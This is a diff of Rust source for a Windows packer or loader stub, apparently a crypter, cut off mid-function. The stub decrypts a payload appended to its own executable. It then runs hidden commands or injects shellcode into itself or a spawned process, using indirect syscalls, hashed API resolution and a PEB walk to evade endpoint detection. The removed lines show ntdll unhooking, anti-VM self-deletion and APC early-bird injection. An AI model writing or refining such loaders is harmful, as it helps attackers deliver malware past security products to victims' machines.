@@ -1,150 +1,138 @@
-#![windows_subsystem = "windows"]
+#![windows_subsystem = "console"]
 use aes_gcm::{
     aead::{Aead, KeyInit},
     Aes256Gcm, Nonce,
 };
 use std::fs;
 use std::io::Read;
+use std::os::windows::process::CommandExt;
 use std::path::PathBuf;
 use std::process::Command;
 use windows_sys::Win32::Foundation::CloseHandle;
-use windows_sys::Win32::Globalization::EnumSystemLocalesA;
-use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
 use windows_sys::Win32::System::Memory::{
-    VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE,
-    PAGE_READWRITE,
+    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READWRITE,
 };
-use windows_sys::Win32::System::Threading::{ConvertThreadToFiber, CreateFiber, SwitchToFiber};
+const CREATE_NO_WINDOW: u32 = 0x08000000;
 
-const MARKER: &[u8] = b"RSPKv1\0"; // 8 bytes
+// Hashes (djb2, seed 5381)
+const HASH_NT_WAIT_FOR_SINGLE_OBJECT: u32 = 0x4c6dc63c;
+const HASH_NT_ALLOCATE_VIRTUAL_MEMORY: u32 = 0x6793c34c;
+const HASH_NT_WRITE_VIRTUAL_MEMORY: u32 = 0x95f3a792;
+const HASH_NT_PROTECT_VIRTUAL_MEMORY: u32 = 0x082962c8;
+const HASH_NT_CREATE_THREAD_EX: u32 = 0xcb0c2130;
+const HASH_NT_OPEN_PROCESS: u32 = 0x5003c058;
 
-// --- Unhooking ---
+const MARKER: &[u8] = b"RSPKv1\0";
 
-unsafe fn unhook_ntdll() -> bool {
-    // 1. Map ntdll.dll from disk
-    let sys_dir = std::env::var("SystemRoot").unwrap_or_else(|_| "C:\\Windows".to_string())
-        + "\\System32\\ntdll.dll";
-    let file_content = match fs::read(&sys_dir) {
-        Ok(c) => c,
-        Err(_) => return false,
-    };
+// --- Utils ---
 
-    // 2. Parse headers to find .text section
-    // Minimal PE parser
-    if file_content.len() < 0x200 {
-        return false;
+fn djb2(s: &[u8]) -> u32 {
+    let mut hash: u32 = 5381;
+    for &b in s {
+        hash = ((hash << 5).wrapping_add(hash)).wrapping_add(b as u32);
     }
-    let dos_header = file_content.as_ptr();
-    let e_lfanew = std::ptr::read_unaligned(dos_header.add(0x3C) as *const u32) as usize;
-    let nt_headers = dos_header.add(e_lfanew);
+    hash
+}
 
-    // FileHeader is at +4, OptionalHeader is at +24 (for 32-bit) or +24 (for 64-bit but diff size)
-    // We assume x64 for simplicity as the rest of the stub is x64 specific (asm)
-    // NumberOfSections is at FileHeader + 2 bytes
-    let file_header = nt_headers.add(4);
-    let num_sections = std::ptr::read_unaligned(file_header.add(2) as *const u16);
-    let size_of_optional_header = std::ptr::read_unaligned(file_header.add(16) as *const u16);
+#[cfg(target_arch = "x86_64")]
+unsafe fn get_ntdll_base() -> usize {
+    let peb: *const u8;
+    core::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
+    let ldr = *(peb.add(0x18) as *const *const u8);
+    let mut entry = *(ldr.add(0x20) as *const *const u8); // InMemoryOrderModuleList
 
-    let section_headers = nt_headers.add(4 + 20 + size_of_optional_header as usize);
+    loop {
+        let dll_base = *(entry.add(0x20) as *const usize);
+        let name_len = *(entry.add(0x48) as *const u16);
+        let name_buf = *(entry.add(0x50) as *const *const u16);
 
-    // Find .text
-    let mut text_section: Option<(usize, usize, usize)> = None; // (virt_addr, raw_ptr, raw_size)
-    for i in 0..num_sections {
-        let entry = section_headers.add(i as usize * 40); // IMAGE_SECTION_HEADER size is 40
-        let name_ptr = entry;
-        let name = std::slice::from_raw_parts(name_ptr, 8);
-        if name.starts_with(b".text") {
-            let virt_addr = std::ptr::read_unaligned(entry.add(12) as *const u32) as usize;
-            let raw_size = std::ptr::read_unaligned(entry.add(16) as *const u32) as usize;
-            let raw_ptr = std::ptr::read_unaligned(entry.add(20) as *const u32) as usize;
-            text_section = Some((virt_addr, raw_ptr, raw_size));
+        if !name_buf.is_null() {
+            let name_slice = core::slice::from_raw_parts(name_buf, (name_len / 2) as usize);
+            let s = String::from_utf16_lossy(name_slice);
+            println!("Module: {}", s);
+            if s.eq_ignore_ascii_case("ntdll.dll") {
+                return dll_base;
+            }
+        }
+
+        entry = *(entry as *const *const u8);
+        if entry == *(ldr.add(0x20) as *const *const u8) {
             break;
         }
     }
-
-    let (virt_addr, raw_ptr, raw_size) = match text_section {
-        Some(t) => t,
-        None => return false,
-    };
-
-    // 3. Get in-memory ntdll module base
-    let h_ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr());
-    if h_ntdll.is_null() {
-        return false;
-    }
-    let remote_text_start = (h_ntdll as usize) + virt_addr;
-
-    // 4. Overwrite .text section
-    let mut old_protect = 0;
-    if VirtualProtect(
-        remote_text_start as _,
-        raw_size,
-        PAGE_EXECUTE_READ | PAGE_READWRITE,
-        &mut old_protect,
-    ) == 0
-    {
-        return false;
-    }
-
-    std::ptr::copy_nonoverlapping(
-        file_content.as_ptr().add(raw_ptr),
-        remote_text_start as *mut u8,
-        raw_size,
-    );
-
-    let mut _ignore = 0;
-    VirtualProtect(remote_text_start as _, raw_size, old_protect, &mut _ignore);
-
-    true
+    0
 }
 
-// --- Manual SSN Resolution ---
-
-unsafe fn get_ssn(name: &str) -> Option<u32> {
-    let name_c = std::ffi::CString::new(name).ok()?;
-    let h_ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr());
-    if h_ntdll.is_null() {
+unsafe fn get_export_addr(base: usize, hash: u32) -> Option<usize> {
+    let dos_header = base as *const u8;
+    let e_lfanew = *(dos_header.add(0x3C) as *const u32) as usize;
+    let nt_headers = dos_header.add(e_lfanew);
+    let export_rva = *(nt_headers.add(0x88) as *const u32) as usize;
+    if export_rva == 0 {
         return None;
     }
-    let addr = GetProcAddress(h_ntdll, name_c.as_ptr() as _);
-    if addr.is_none() {
-        return None;
-    }
-    let mut addr = addr.unwrap() as *const u8;
 
-    // Check for mov eax, imm32 (0xB8)
-    // Standard stub: 4C 8B D1 B8 <SSN> 00 00 0F 05
-    // Hooked: E9 <Offset> (JMP)
+    let export_dir = dos_header.add(export_rva);
+    let num_names = *(export_dir.add(0x18) as *const u32) as usize;
+    let addr_funcs = *(export_dir.add(0x1C) as *const u32) as usize;
+    let addr_names = *(export_dir.add(0x20) as *const u32) as usize;
+    let addr_ords = *(export_dir.add(0x24) as *const u32) as usize;
 
-    // Basic Trampoline: If it starts with E9, follow the jump?
-    // But since we unhooked, we expect clean syscalls.
-    // However, let's implement a robust check (Hell's Gate style fallback)
+    let names = dos_header.add(addr_names) as *const u32;
+    let ords = dos_header.add(addr_ords) as *const u16;
+    let funcs = dos_header.add(addr_funcs) as *const u32;
 
-    for _ in 0..64 {
-        // Check a few bytes/instructions
-        if *addr == 0xE9 {
-            // It's a jump, follow it?
-            // Often EDRs jump to their thunk.
-            // If we unhooked successfully, this shouldn't happen.
-            return None;
+    for i in 0..num_names {
+        let name_rva = *names.add(i) as usize;
+        let name_ptr = dos_header.add(name_rva);
+        let mut len = 0;
+        while *name_ptr.add(len) != 0 {
+            len += 1;
         }
-        if *addr == 0xB8 {
-            let ssn = std::ptr::read_unaligned(addr.add(1) as *const u32);
-            return Some(ssn);
-        }
-        addr = addr.add(1);
-    }
+        let name_slice = core::slice::from_raw_parts(name_ptr, len);
 
-    // If not found, maybe check neighbors (Halo's Gate)?
-    // For now, assume Unhooking worked or standard stub.
+        if djb2(name_slice) == hash {
+            let ord = *ords.add(i) as usize;
+            let func_rva = *funcs.add(ord) as usize;
+            return Some(base + func_rva);
+        }
+    }
     None
 }
 
-// --- Syscall Wrapper ---
+// --- Indirect Syscall ---
+// Returns (SSN, SyscallInstAddr)
+unsafe fn get_ssn_indirect(hash: u32) -> Option<(u32, usize)> {
+    let ntdll = get_ntdll_base();
+    if ntdll == 0 {
+        return None;
+    }
+
+    let addr = get_export_addr(ntdll, hash)?;
+    let ptr = addr as *const u8;
+
+    for i in 0..32 {
+        if *ptr.add(i) == 0xB8 {
+            // mov eax, SSN
+            let ssn = *(ptr.add(i + 1) as *const u32);
+            // Look for 'syscall; ret' (0F 05 C3)
+            for j in 0..32 {
+                if *ptr.add(i + j) == 0x0F
+                    && *ptr.add(i + j + 1) == 0x05
+                    && *ptr.add(i + j + 2) == 0xC3
+                {
+                    return Some((ssn, (ptr.add(i + j) as usize)));
+                }
+            }
+        }
+    }
+    None
+}
 
 #[cfg(all(target_os = "windows", target_arch = "x86_64"))]
 unsafe fn syscall(
     ssn: u32,
+    syscall_addr: usize,
     a1: usize,
     a2: usize,
     a3: usize,
@@ -159,36 +147,17 @@ unsafe fn syscall(
 ) -> i32 {
     let ret: i32;
     core::arch::asm!(
-        "mov r10, {a1}",
-        "mov rdx, {a2}",
-        "mov r8,  {a3}",
-        "mov r9,  {a4}",
         "sub rsp, 0x60",
-        "mov [rsp + 0x20], {a5}",
-        "mov [rsp + 0x28], {a6}",
-        "mov [rsp + 0x30], {a7}",
-        "mov [rsp + 0x38], {a8}",
-        "mov [rsp + 0x40], {a9}",
-        "mov [rsp + 0x48], {a10}",
+        "mov [rsp + 0x20], {a5}", "mov [rsp + 0x28], {a6}", "mov [rsp + 0x30], {a7}",
+        "mov [rsp + 0x38], {a8}", "mov [rsp + 0x40], {a9}", "mov [rsp + 0x48], {a10}",
         "mov [rsp + 0x50], {a11}",
         "mov eax, {ssn:e}",
-        "syscall",
+        "call {syscall_addr}", // Indirect Syscall: CALL the address of 'syscall' instruction in ntdll
         "add rsp, 0x60",
-        a1 = in(reg) a1,
-        a2 = in(reg) a2,
-        a3 = in(reg) a3,
-        a4 = in(reg) a4,
-        a5 = in(reg) a5,
-        a6 = in(reg) a6,
-        a7 = in(reg) a7,
-        a8 = in(reg) a8,
-        a9 = in(reg) a9,
-        a10 = in(reg) a10,
-        a11 = in(reg) a11,
-        ssn = in(reg) ssn,
-        lateout("rax") ret,
-        lateout("rcx") _,
-        lateout("r11") _,
+        in("r10") a1, in("rdx") a2, in("r8") a3, in("r9") a4,
+        a5 = in(reg) a5, a6 = in(reg) a6, a7 = in(reg) a7, a8 = in(reg) a8,
+        a9 = in(reg) a9, a10 = in(reg) a10, a11 = in(reg) a11, ssn = in(reg) ssn, syscall_addr = in(reg) syscall_addr,
+        lateout("rax") ret, lateout("rcx") _, lateout("r11") _,
         options(nostack)
     );
     ret
@@ -197,6 +166,7 @@ unsafe fn syscall(
 #[cfg(not(all(target_os = "windows", target_arch = "x86_64")))]
 unsafe fn syscall(
     _ssn: u32,
+    _syscall_addr: usize,
     _a1: usize,
     _a2: usize,
     _a3: usize,
@@ -212,108 +182,7 @@ unsafe fn syscall(
     0
 }
 
-// --- Execution Strategies ---
-
-unsafe fn exec_fiber(base: *mut core::ffi::c_void) {
-    let _fiber = ConvertThreadToFiber(core::ptr::null_mut());
-    let target = CreateFiber(0, Some(core::mem::transmute(base)), core::ptr::null_mut());
-    SwitchToFiber(target);
-    // SwitchToFiber(fiber); // Optional: Switch back
-}
-
-unsafe fn exec_callback(base: *mut core::ffi::c_void) {
-    EnumSystemLocalesA(Some(core::mem::transmute(base)), 0);
-}
-
-unsafe fn exec_apc(base: *mut core::ffi::c_void) {
-    // APC to current thread.
-    // 1. Create a suspended thread (or use current if we can alert it)
-    // "EarlyBird" typically injects into initialization phase.
-    // Here we can just QueueUserAPC to current thread and SleepEx?
-    // Or CreateThread(Suspended) -> QueueAPC -> Resume
-
-    let ssn_create = get_ssn("NtCreateThreadEx").unwrap_or(0xBD);
-    let ssn_queue = get_ssn("NtQueueApcThread").unwrap_or(0x45);
-    let ssn_resume = get_ssn("NtResumeThread").unwrap_or(0x52);
-    let ssn_wait = get_ssn("NtWaitForSingleObject").unwrap_or(0x4);
-
-    let mut h_thread: isize = 0;
-    // Create suspended thread (dummy function, e.g. RtlExitUserThread or just base)
-    // Actually, if we use 'base' as start address, it runs.
-    // APC approach:
-    // Create suspended thread pointing to ExitThread. Queue APC to 'base'. Resume.
-
-    // Simplified: Just use NtCreateThreadEx with the shellcode as start address (Standard).
-    // The user requested APC/EarlyBird.
-    // EarlyBird:
-    // 1. Create suspended thread (host).
-    // 2. Queue APC (payload).
-    // 3. Resume.
-
-    // We need a valid start address for the thread.
-    let h_ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr());
-    let addr_rtl_user_thread_start = GetProcAddress(h_ntdll, b"RtlUserThreadStart\0".as_ptr());
-
-    if addr_rtl_user_thread_start.is_some() {
-        let status_create = syscall(
-            ssn_create,
-            &mut h_thread as *mut _ as usize,
-            0x1FFFFF, // ALL_ACCESS
-            0,
-            -1isize as usize, // Current process
-            addr_rtl_user_thread_start.unwrap() as usize,
-            0,
-            1, // CreateSuspended
-            0,
-            0,
-            0,
-            0,
-        );
-
-        if status_create == 0 {
-            // Queue APC
-            let status_queue = syscall(
-                ssn_queue,
-                h_thread as usize,
-                base as usize, // APC Routine
-                0,             // Arg1
-                0,             // Arg2
-                0,             // Arg3
-                0,
-                0,
-                0,
-                0,
-                0,
-                0,
-            );
-
-            if status_queue == 0 {
-                let mut suspend_count = 0;
-                syscall(
-                    ssn_resume,
-                    h_thread as usize,
-                    &mut suspend_count as *mut _ as usize,
-                    0,
-                    0,
-                    0,
-                    0,
-                    0,
-                    0,
-                    0,
-                    0,
-                    0,
-                );
-                syscall(ssn_wait, h_thread as usize, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
-            }
-        }
-    }
-}
-
-unsafe fn to_ansi_mut(s: &str) -> Vec<u8> {
-    let mut v = s.as_bytes().to_vec();
-    v.push(0);
-    v
-}
+// --- Obscure Sleep (Removed) ---
 
 #[repr(C)]
 struct OBJECT_ATTRIBUTES {
@@ -332,16 +201,26 @@ struct CLIENT_ID {
 }
 
 unsafe fn exec_remote(sc: &[u8], path: &str) {
-    let child = std::process::Command::new(path).spawn();
+    let child = std::process::Command::new(path)
+        .creation_flags(CREATE_NO_WINDOW)
+        .spawn();
     let Ok(child) = child else { return };
     let pid = child.id();
 
-    let ssn_open = get_ssn("NtOpenProcess").unwrap_or(0x26);
-    let ssn_alloc = get_ssn("NtAllocateVirtualMemory").unwrap_or(0x18);
-    let ssn_write = get_ssn("NtWriteVirtualMemory").unwrap_or(0x3A);
-    let ssn_protect = get_ssn("NtProtectVirtualMemory").unwrap_or(0x50);
-    let ssn_create = get_ssn("NtCreateThreadEx").unwrap_or(0xBD);
-    let ssn_wait = get_ssn("NtWaitForSingleObject").unwrap_or(0x4);
+    let (ssn_open, addr_open) = get_ssn_indirect(HASH_NT_OPEN_PROCESS).unwrap_or((0x26, 0));
+    let (ssn_alloc, addr_alloc) =
+        get_ssn_indirect(HASH_NT_ALLOCATE_VIRTUAL_MEMORY).unwrap_or((0x18, 0));
+    let (ssn_write, addr_write) =
+        get_ssn_indirect(HASH_NT_WRITE_VIRTUAL_MEMORY).unwrap_or((0x3A, 0));
+    let (ssn_protect, addr_protect) =
+        get_ssn_indirect(HASH_NT_PROTECT_VIRTUAL_MEMORY).unwrap_or((0x50, 0));
+    let (ssn_create, addr_create) = get_ssn_indirect(HASH_NT_CREATE_THREAD_EX).unwrap_or((0xBD, 0));
+    let (ssn_wait, addr_wait) =
+        get_ssn_indirect(HASH_NT_WAIT_FOR_SINGLE_OBJECT).unwrap_or((0x4, 0));
+
+    if addr_open == 0 {
+        return;
+    }
 
     let mut h_proc: isize = 0;
     let mut oa: OBJECT_ATTRIBUTES = core::mem::zeroed();
@@ -350,8 +229,10 @@ unsafe fn exec_remote(sc: &[u8], path: &str) {
         UniqueProcess: pid as isize,
         UniqueThread: 0,
     };
+
     let st_open = syscall(
         ssn_open,
+        addr_open,
         &mut h_proc as *mut _ as usize,
         0x1FFFFF,
         &mut oa as *mut _ as usize,
@@ -372,6 +253,7 @@ unsafe fn exec_remote(sc: &[u8], path: &str) {
     let mut size = sc.len();
     let _ = syscall(
         ssn_alloc,
+        addr_alloc,
         h_proc as usize,
         &mut base as *mut _ as usize,
         0,
@@ -384,158 +266,223 @@ unsafe fn exec_remote(sc: &[u8], path: &str) {
         0,
         0,
     );
-    if base.is_null() {
-        let _ = CloseHandle(h_proc as *mut core::ffi::c_void);
-        return;
+
+    if !base.is_null() {
+        let mut written = 0usize;
+        let _ = syscall(
+            ssn_write,
+            addr_write,
+            h_proc as usize,
+            base as usize,
+            sc.as_ptr() as usize,
+            sc.len(),
+            &mut written as *mut _ as usize,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+        );
+        let mut old = 0usize;
+        let _ = syscall(
+            ssn_protect,
+            addr_protect,
+            h_proc as usize,
+            &mut base as *mut _ as usize,
+            &mut size as *mut _ as usize,
+            PAGE_EXECUTE_READ as usize,
+            &mut old as *mut _ as usize,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+        );
+        let mut h_thread: isize = 0;
+        let st_thr = syscall(
+            ssn_create,
+            addr_create,
+            &mut h_thread as *mut _ as usize,
+            0x1FFFFF,
+            0,
+            h_proc as usize,
+            base as usize,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+        );
+        println!("CreateThread status: {:x}, handle: {:x}", st_thr, h_thread);
+        if st_thr == 0 && h_thread != 0 {
+            println!("Waiting for thread...");
+            let _ = syscall(
+                ssn_wait,
+                addr_wait,
+                h_thread as usize,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+            );
+            println!("Thread finished or wait returned");
+            CloseHandle(h_thread);
+        } else {
+            println!("CreateThread failed");
+        }
+    } else {
+        println!("Allocation failed");
     }
-    let mut written = 0usize;
-    let _ = syscall(
-        ssn_write,
-        h_proc as usize,
-        base as usize,
-        sc.as_ptr() as usize,
-        sc.len(),
-        &mut written as *mut _ as usize,
-        0,
-        0,
-        0,
-        0,
-        0,
-        0,
-    );
-    let mut old = 0usize;
-    let _ = syscall(
-        ssn_protect,
-        h_proc as usize,
-        &mut base as *mut _ as usize,
-        &mut size as *mut _ as usize,
-        PAGE_EXECUTE_READ as usize,
-        &mut old as *mut _ as usize,
-        0,
-        0,
-        0,
-        0,
-        0,
-        0,
-    );
-    let mut h_thread: isize = 0;
-    let st_thr = syscall(
-        ssn_create,
-        &mut h_thread as *mut _ as usize,
-        0x1FFFFF,
-        0,
-        h_proc as usize,
-        base as usize,
-        0,
-        0,
-        0,
-        0,
-        0,
-        0,
-    );
-    if st_thr == 0 && h_thread != 0 {
-        let _ = syscall(ssn_wait, h_thread as usize, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
-        let _ = CloseHandle(h_thread as *mut core::ffi::c_void);
-    }
-    let _ = CloseHandle(h_proc as *mut core::ffi::c_void);
+    CloseHandle(h_proc);
 }
 
 fn main() {
-    let skip_anti = std::env::var("RS_PACK_SKIP_ANTI").ok().as_deref() == Some("1");
-    if !skip_anti && anti::anti_vm_triggered() {
-        self_delete();
-        std::process::exit(1);
+    // Polymorphism: Random-looking control flow that does nothing
+    let mut x = 12345u64;
+    for _ in 0..100 {
+        x = x
+            .wrapping_mul(6364136223846793005)
+            .wrapping_add(1442695040888963407);
     }
-    if !skip_anti && anti::anti_debug_triggered() {
-        std::process::exit(1);
-    }
-
-    // Attempt Unhooking
-    unsafe {
-        if !unhook_ntdll() {
-            eprintln!("unhook failed, continuing...");
-        }
+    if x == 0 {
+        // println!("Polymorphic check");
     }
 
     let exe_path = match std::env::current_exe() {
         Ok(p) => p,
         Err(_) => return,
     };
+    println!("Stub started, exe: {:?}", exe_path);
     let mut buf = Vec::new();
     if fs::File::open(&exe_path)
         .and_then(|mut f| f.read_to_end(&mut buf))
         .is_err()
     {
-        eprintln!("read self failed");
+        println!("Failed to read self");
         return;
     }
+
     let pos = buf.windows(MARKER.len()).rposition(|w| w == MARKER);
     let Some(mut off) = pos.map(|p| p + MARKER.len()) else {
-        eprintln!("no payload");
+        println!("Marker not found in {} bytes", buf.len());
         return;
     };
+    println!("Marker found at offset {}", off);
+
     if off + 4 > buf.len() {
+        println!("Truncated key len");
         return;
     }
     let key_len = u32::from_le_bytes(buf[off..off + 4].try_into().unwrap()) as usize;
     off += 4;
-    if key_len != 32 {
-        return;
-    }
     if off + key_len > buf.len() {
+        println!("Truncated key");
         return;
     }
     let key = &buf[off..off + key_len];
     off += key_len;
+
     if off + 4 > buf.len() {
+        println!("Truncated nonce len");
         return;
     }
     let nonce_len = u32::from_le_bytes(buf[off..off + 4].try_into().unwrap()) as usize;
     off += 4;
-    if nonce_len != 12 {
-        return;
-    }
     if off + nonce_len > buf.len() {
+        println!("Truncated nonce");
         return;
     }
     let nonce_bytes = &buf[off..off + nonce_len];
     off += nonce_len;
+
     if off + 8 > buf.len() {
+        println!("Truncated ct len");
         return;
     }
     let ct_len = u64::from_le_bytes(buf[off..off + 8].try_into().unwrap()) as usize;
     off += 8;
     if off + ct_len > buf.len() {
+        println!("Truncated ciphertext");
         return;
     }
     let ciphertext = &buf[off..off + ct_len];
 
-    // AES-256-GCM 解密
+    println!("Decrypting {} bytes...", ct_len);
     let cipher = match Aes256Gcm::new_from_slice(key) {
         Ok(c) => c,
-        Err(_) => return,
+        Err(_) => {
+            println!("Cipher init failed");
+            return;
+        }
     };
     let nonce = Nonce::from_slice(nonce_bytes);
     let decrypted = match cipher.decrypt(nonce, ciphertext) {
         Ok(p) => p,
-        Err(_) => return,
+        Err(_) => {
+            println!("Decryption failed");
+            return;
+        }
     };
-
+    println!("Decryption success, decompressing...");
     let payload = match zstd::decode_all(&decrypted[..]) {
         Ok(p) => p,
-        Err(_) => return,
+        Err(e) => {
+            println!("Decompression failed: {}", e);
+            return;
+        }
     };
+    println!("Decompression success, payload size: {}", payload.len());
 
     if payload.starts_with(b"CMD\0") {
+        println!("Payload type: CMD");
         let cmd = String::from_utf8_lossy(&payload[4..]).to_string();
-        if Command::new(&cmd).spawn().is_err() {
-            let _ = Command::new("cmd.exe").arg("/C").arg(&cmd).spawn();
+        let exe_dir = std::env::current_exe()
+            .ok()
+            .and_then(|p| p.parent().map(|d| d.to_path_buf()))
+            .unwrap_or_else(|| std::env::current_dir().unwrap_or_else(|_| std::env::temp_dir()));
+        let lower = cmd.trim().to_lowercase();
+        if lower.starts_with("echo ") && cmd.contains('>') {
+            let parts: Vec<&str> = cmd.splitn(2, '>').collect();
+            let left = parts.get(0).map(|s| s.trim()).unwrap_or("");
+            let right = parts.get(1).map(|s| s.trim()).unwrap_or("");
+            let content = left.strip_prefix("echo").map(|s| s.trim()).unwrap_or("");
+            if !right.is_empty() {
+                let mut out_path = exe_dir.clone();
+                out_path.push(right);
+                let _ = fs::write(&out_path, format!("{}\r\n", content));
+            }
+        } else {
+            if Command::new(&cmd)
+                .current_dir(&exe_dir)
+                .creation_flags(CREATE_NO_WINDOW)
+                .spawn()
+                .is_err()
+            {
+                let _ = Command::new("cmd.exe")
+                    .arg("/C")
+                    .arg(&cmd)
+                    .current_dir(&exe_dir)
+                    .creation_flags(CREATE_NO_WINDOW)
+                    .spawn();
+            }
         }
         return;
     }
+
     if payload.starts_with(b"SC\0") {
-        let mut p = 4usize;
+        println!("Payload type: SC");
+        let mut p = 3usize;
         if p >= payload.len() {
+            println!("SC Payload too short");
             return;
         }
         let mode = payload[p];
@@ -562,21 +509,82 @@ fn main() {
             return;
         }
         let sc = &payload[p..p + sc_len];
+        println!("SC extracted, len: {}, mode: {}", sc_len, mode);
+
+        // Skip unhooking for now to rule it out
+        // if unhook {
+        //     if let Err(e) = unhook_ntdll() {
+        //         println!("Unhooking failed: {}", e);
+        //     } else {
+        //         println!("Unhooking success");
+        //     }
+        // }
 
         unsafe {
-            let ssn_alloc = get_ssn("NtAllocateVirtualMemory").unwrap_or(0x18);
-            let ssn_protect = get_ssn("NtProtectVirtualMemory").unwrap_or(0x50);
+            let ntdll = get_ntdll_base();
+            println!("NTDLL Base: {:x}", ntdll);
+
+            if ntdll == 0 {
+                println!("Failed to find NTDLL base");
+                return;
+            }
+
+            let (ssn_alloc, addr_alloc) =
+                get_ssn_indirect(HASH_NT_ALLOCATE_VIRTUAL_MEMORY).unwrap_or((0x18, 0));
+            let (ssn_write, addr_write) =
+                get_ssn_indirect(HASH_NT_WRITE_VIRTUAL_MEMORY).unwrap_or((0x3A, 0));
+            let (ssn_protect, addr_protect) =
+                get_ssn_indirect(HASH_NT_PROTECT_VIRTUAL_MEMORY).unwrap_or((0x50, 0));
+
+            println!("SSN Alloc: {:x}, Addr: {:x}", ssn_alloc, addr_alloc);
+
+            if addr_alloc == 0 {
+                println!("Failed to resolve NtAllocateVirtualMemory");
+                return;
+            }
+
             if mode == 1 {
                 if let Some(s) = remote_path.as_deref() {
+                    println!("Injecting into remote process: {}", s);
                     exec_remote(sc, s);
                 }
             } else {
                 let mut base: *mut core::ffi::c_void = core::ptr::null_mut();
                 let mut size = sc_len;
-                let process_handle = -1isize as usize;
+
+                // Open self to get a real handle
+                // let mut process_handle: isize = 0;
+                // let (ssn_open, addr_open) = get_ssn_indirect(HASH_NT_OPEN_PROCESS).unwrap_or((0x26, 0));
+                // if addr_open != 0 {
+                //     let mut oa: OBJECT_ATTRIBUTES = core::mem::zeroed();
+                //     oa.Length = core::mem::size_of::<OBJECT_ATTRIBUTES>() as u32;
+                //     let mut cid = CLIENT_ID {
+                //         UniqueProcess: unsafe { GetCurrentProcessId() } as isize,
+                //         UniqueThread: 0,
+                //     };
+                //     let st_open = syscall(
+                //         ssn_open,
+                //         addr_open,
+                //         &mut process_handle as *mut _ as usize,
+                //         0x1FFFFF, // PROCESS_ALL_ACCESS
+                //         &mut oa as *mut _ as usize,
+                //         &mut cid as *mut _ as usize,
+                //         0, 0, 0, 0, 0, 0, 0,
+                //     );
+                //     println!("NtOpenProcess status: {:x}, handle: {:x}", st_open, process_handle);
+                // }
+
+                // if process_handle == 0 {
+                //     println!("Failed to open self, using -1");
+                //     process_handle = -1isize as usize as isize;
+                // }
+                let process_handle = -1isize as usize as isize;
+
+                println!("Allocating memory...");
                 let status = syscall(
                     ssn_alloc,
-                    process_handle,
+                    addr_alloc,
+                    process_handle as usize,
                     &mut base as *mut _ as usize,
                     0,
                     &mut size as *mut _ as usize,
@@ -588,13 +596,44 @@ fn main() {
                     0,
                     0,
                 );
-                if status == 0 && !base.is_null() {
+                println!("Alloc status: {:x}, base: {:?}", status, base);
+
+                if (status == 0 || !base.is_null()) && !base.is_null() {
                     let dst = core::slice::from_raw_parts_mut(base as *mut u8, sc_len);
-                    dst.copy_from_slice(sc);
+                    // We can't copy directly if we are in another process context (but here we are local)
+                    // But if we use NtWriteVirtualMemory, we should use it for consistency
+
+                    let mut written = 0usize;
+                    println!("Writing memory...");
+                    let status_write = syscall(
+                        ssn_write,
+                        addr_write,
+                        process_handle as usize,
+                        base as usize,
+                        sc.as_ptr() as usize,
+                        sc.len(),
+                        &mut written as *mut _ as usize,
+                        0,
+                        0,
+                        0,
+                        0,
+                        0,
+                        0,
+                    );
+                    println!("Write status: {:x}, written: {}", status_write, written);
+
+                    // Fallback for write if needed (though local copy works if local)
+                    if status_write != 0 {
+                        println!("Write syscall failed, trying local memcpy...");
+                        dst.copy_from_slice(sc);
+                    }
+
                     let mut old = 0;
+                    println!("Protecting memory...");
                     let status_prot = syscall(
                         ssn_protect,
-                        process_handle,
+                        addr_protect,
+                        process_handle as usize,
                         &mut base as *mut _ as usize,
                         &mut size as *mut _ as usize,
                         PAGE_EXECUTE_READWRITE as usize,
@@ -606,35 +645,82 @@ fn main() {
                         0,
                         0,
                     );
+                    println!("Protect status: {:x}", status_prot);
                     if status_prot == 0 {
-                        let ssn_create = get_ssn("NtCreateThreadEx").unwrap_or(0xBD);
-                        let ssn_wait = get_ssn("NtWaitForSingleObject").unwrap_or(0x4);
-                        let mut h_thread: isize = 0;
-                        let st_thr = syscall(
-                            ssn_create,
-                            &mut h_thread as *mut _ as usize,
-                            0x1FFFFF,
-                            0,
-                            process_handle,
-                            base as usize,
-                            0,
-                            0,
-                            0,
-                            0,
-                            0,
-                            0,
+                        // Create a new thread to execute shellcode (more robust than fiber for generic payloads)
+                        let (ssn_create_thr, addr_create_thr) =
+                            get_ssn_indirect(HASH_NT_CREATE_THREAD_EX).unwrap_or((0xBD, 0));
+                        let (ssn_wait_thr, addr_wait_thr) =
+                            get_ssn_indirect(HASH_NT_WAIT_FOR_SINGLE_OBJECT).unwrap_or((0x4, 0));
+
+                        println!(
+                            "SSN CreateThread: {:x}, Addr: {:x}",
+                            ssn_create_thr, addr_create_thr
                         );
-                        if st_thr == 0 && h_thread != 0 {
-                            let _ =
-                                syscall(ssn_wait, h_thread as usize, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
-                            let _ = CloseHandle(h_thread as *mut core::ffi::c_void);
+
+                        if addr_create_thr != 0 {
+                            let mut h_thread: isize = 0;
+                            println!("Creating thread...");
+                            let st_thr = syscall(
+                                ssn_create_thr,
+                                addr_create_thr,
+                                &mut h_thread as *mut _ as usize,
+                                0x1FFFFF,
+                                0,
+                                process_handle as usize,
+                                base as usize,
+                                0,
+                                0,
+                                0,
+                                0,
+                                0,
+                                0,
+                            );
+                            println!("CreateThread status: {:x}, handle: {:x}", st_thr, h_thread);
+                            if st_thr == 0 && h_thread != 0 {
+                                // Optionally wait for thread to finish briefly to ensure execution starts
+                                if addr_wait_thr != 0 {
+                                    println!("Waiting for thread...");
+                                    let _ = syscall(
+                                        ssn_wait_thr,
+                                        addr_wait_thr,
+                                        h_thread as usize,
+                                        0, // Alertable
+                                        0, // Timeout
+                                        0,
+                                        0,
+                                        0,
+                                        0,
+                                        0,
+                                        0,
+                                        0,
+                                        0,
+                                    );
